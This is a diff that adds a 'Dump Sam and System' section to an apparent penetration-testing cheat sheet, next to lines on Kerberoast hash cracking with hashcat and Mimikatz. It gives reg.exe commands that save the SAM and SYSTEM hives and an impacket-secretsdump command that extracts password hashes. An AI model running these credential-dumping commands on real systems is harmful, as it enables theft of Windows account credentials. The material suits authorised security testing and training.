@@ -120,6 +120,19 @@ To crack TGS-REP Hashes:
 sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
 
+### Dump Sam and System
+
+Backup of the SAM and SYSTEM file and then secretsdump to extract the hashes.
+
+```bash
+C:\> reg.exe save hklm\SYSTEM C:\SYSTEM.bak
+C:\> reg.exe save hklm\SAM C:\SAM.bak
+```
+
+```bash
+kali@kali: impacket-secretsdump -sam SAM.bak -system SYSTEM.bak LOCAL
+```
+
 ### Mimikatz
 
 *Mimikatz needs Administrator privileges to run*
